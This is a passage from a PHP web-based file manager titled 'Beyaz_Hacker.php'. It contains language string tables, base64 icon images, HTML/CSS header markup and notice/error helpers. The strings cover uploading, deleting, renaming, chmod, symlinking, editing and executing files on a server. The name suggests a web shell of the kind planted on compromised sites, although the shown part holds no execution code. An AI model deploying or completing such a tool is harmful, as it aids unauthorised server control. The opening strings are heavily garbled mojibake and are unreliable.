Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½ Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½ Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½ Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½ Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½ "[%1]" Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½ [%2] .',
'not_readable' => '"[%1]" Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½ Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½Ã?ï¿½Ã¯Â¿Â½Ã?Â¯Ã?Â¿Ã?Â½Ã?ï¿½Ã?Â¯Ã?ï¿½Ã?Â¿Ã?ï¿½Ã?Â½.'
		);

	case 'en':
	default:

		$date_format = 'n/j/y H:i:s';
		$word_charset = 'ISO-8859-1';

		return array(
'directory' => 'Directory',
'file' => 'File',
'filename' => 'Filename',

'size' => 'Size',
'permission' => 'Permission',
'owner' => 'Owner',
'group' => 'Group',
'other' => 'Others',
'functions' => 'Functions',

'read' => 'read',
'write' => 'write',
'execute' => 'execute',

'create_symlink' => 'create symlink',
'delete' => 'delete',
'rename' => 'rename',
'move' => 'move',
'copy' => 'copy',
'edit' => 'edit',
'download' => 'download',
'upload' => 'upload',
'create' => 'create',
'change' => 'change',
'save' => 'save',
'set' => 'set',
'reset' => 'reset',
'relative' => 'Relative path to target',

'yes' => 'Yes',
'no' => 'No',
'back' => 'back',
'destination' => 'Destination',
'symlink' => 'Symlink',
'no_output' => 'no output',

'user' => 'User',
'password' => 'Password',
'add' => 'add',
'add_basic_auth' => 'add basic-authentification',

'uploaded' => '"[%1]" has been uploaded.',
'not_uploaded' => '"[%1]" could not be uploaded.',
'already_exists' => '"[%1]" already exists.',
'created' => '"[%1]" has been created.',
'not_created' => '"[%1]" could not be created.',
'really_delete' => 'Delete these files?',
'deleted' => "These files have been deleted:\n[%1]",
'not_deleted' => "These files could not be deleted:\n[%1]",
'rename_file' => 'Rename file:',
'renamed' => '"[%1]" has been renamed to "[%2]".',
'not_renamed' => '"[%1] could not be renamed to "[%2]".',
'move_files' => 'Move these files:',
'moved' => "These files have been moved to \"[%2]\":\n[%1]",
'not_moved' => "These files could not be moved to \"[%2]\":\n[%1]",
'copy_files' => 'Copy these files:',
'copied' => "These files have been copied to \"[%2]\":\n[%1]",
'not_copied' => "These files could not be copied to \"[%2]\":\n[%1]",
'not_edited' => '"[%1]" can not be edited.',
'executed' => "\"[%1]\" has been executed successfully:\n{%2}",
'not_executed' => "\"[%1]\" could not be executed successfully:\n{%2}",
'saved' => '"[%1]" has been saved.',
'not_saved' => '"[%1]" could not be saved.',
'symlinked' => 'Symlink from "[%2]" to "[%1]" has been created.',
'not_symlinked' => 'Symlink from "[%2]" to "[%1]" could not be created.',
'permission_for' => 'Permission of "[%1]":',
'permission_set' => 'Permission of "[%1]" was set to [%2].',
'permission_not_set' => 'Permission of "[%1]" could not be set to [%2].',
'not_readable' => '"[%1]" can not be read.'
		);

	}

}

function getimage ($image) {
	switch ($image) {
	case 'file':
		return base64_decode('R0lGODlhEQANAJEDAJmZmf///wAAAP///yH5BAHoAwMALAAAAAARAA0AAAItnIGJxg0B42rsiSvCA/REmXQWhmnih3LUSGaqg35vFbSXucbSabunjnMohq8CADsA');
	case 'folder':
		return base64_decode('R0lGODlhEQANAJEDAJmZmf///8zMzP///yH5BAHoAwMALAAAAAARAA0AAAIqnI+ZwKwbYgTPtIudlbwLOgCBQJYmCYrn+m3smY5vGc+0a7dhjh7ZbygAADsA');
	case 'hidden_file':
		return base64_decode('R0lGODlhEQANAJEDAMwAAP///5mZmf///yH5BAHoAwMALAAAAAARAA0AAAItnIGJxg0B42rsiSvCA/REmXQWhmnih3LUSGaqg35vFbSXucbSabunjnMohq8CADsA');
	case 'link':
		return base64_decode('R0lGODlhEQANAKIEAJmZmf///wAAAMwAAP///wAAAAAAAAAAACH5BAHoAwQALAAAAAARAA0AAAM5SArcrDCCQOuLcIotwgTYUllNOA0DxXkmhY4shM5zsMUKTY8gNgUvW6cnAaZgxMyIM2zBLCaHlJgAADsA');
	case 'smiley':
		return base64_decode('R0lGODlhEQANAJECAAAAAP//AP///wAAACH5BAHoAwIALAAAAAARAA0AAAIslI+pAu2wDAiz0jWD3hqmBzZf1VCleJQch0rkdnppB3dKZuIygrMRE/oJDwUAOwA=');
	case 'arrow':
		return base64_decode('R0lGODlhEQANAIABAAAAAP///yH5BAEKAAEALAAAAAARAA0AAAIdjA9wy6gNQ4pwUmav0yvn+hhJiI3mCJ6otrIkxxQAOw==');
	}
}

function html_header () {
	global $site_charset;

	echo <<<END
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
     "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>

<meta http-equiv="Content-Type" content="text/html; charset=$site_charset" />

<title>Beyaz_Hacker.php</title>

<style type="text/css">
body { font: small sans-serif; text-align: center }
img { width: 17px; height: 13px }
a, a:visited { text-decoration: none; color: navy }
hr { border-style: none; height: 1px; background-color: silver; color: silver }
#main { margin-top: 6pt; margin-left: auto; margin-right: auto; border-spacing: 1px }
#main th { background: #eee; padding: 3pt 3pt 0pt 3pt }
.listing th, .listing td { padding: 1px 3pt 0 3pt }
.listing th { border: 1px solid silver }
.listing td { border: 1px solid #ddd; background: white }
.listing .checkbox { text-align: center }
.listing .filename { text-align: left }
.listing .size { text-align: right }
.listing th.permission { text-align: left }
.listing td.permission { font-family: monospace }
.listing .owner { text-align: left }
.listing .group { text-align: left }
.listing .functions { text-align: left }
.listing_footer td { background: #eee; border: 1px solid silver }
#directory, #upload, #create, .listing_footer td, #error td, #notice td { text-align: left; padding: 3pt }
#directory { background: #eee; border: 1px solid silver }
#upload { padding-top: 1em }
#create { padding-bottom: 1em }
.small, .small option { font-size: x-small }
textarea { border: none; background: white }
table.dialog { margin-left: auto; margin-right: auto }
td.dialog { background: #eee; padding: 1ex; border: 1px solid silver; text-align: center }
#permission { margin-left: auto; margin-right: auto }
#permission td { padding-left: 3pt; padding-right: 3pt; text-align: center }
td.permission_action { text-align: right }
#symlink { background: #eee; border: 1px solid silver }
#symlink td { text-align: left; padding: 3pt }
#red_button { width: 120px; color: #400 }
#green_button { width: 120px; color: #040 }
#error td { background: maroon; color: white; border: 1px solid silver }
#notice td { background: green; color: white; border: 1px solid silver }
#notice pre, #error pre { background: silver; color: black; padding: 1ex; margin-left: 1ex; margin-right: 1ex }
code { font-size: 12pt }
td { white-space: nowrap }
</style>

<script type="text/javascript">
<!--
function activate (name) {
	if (document && document.forms[0] && document.forms[0].elements['focus']) {
		document.forms[0].elements['focus'].value = name;
	}
}
//-->
</script>

</head>
<body>


END;

}

function html_footer () {

	echo <<<END
</body>


</html>
END;

}

function notice ($phrase) {
	global $cols;

	$args = func_get_args();
	array_shift($args);

	return '<tr id="notice">
	<td colspan="' . $cols . '">' . phrase($phrase, $args) . '</td>
</tr>
';

}

function error ($phrase) {
	global $cols;

	$args = func_get_args();
	array_shift($args);

	return '<tr id="error">
	<td colspan="' . $cols . '">' . phrase($phrase, $args) . '</td>
</tr>
';

}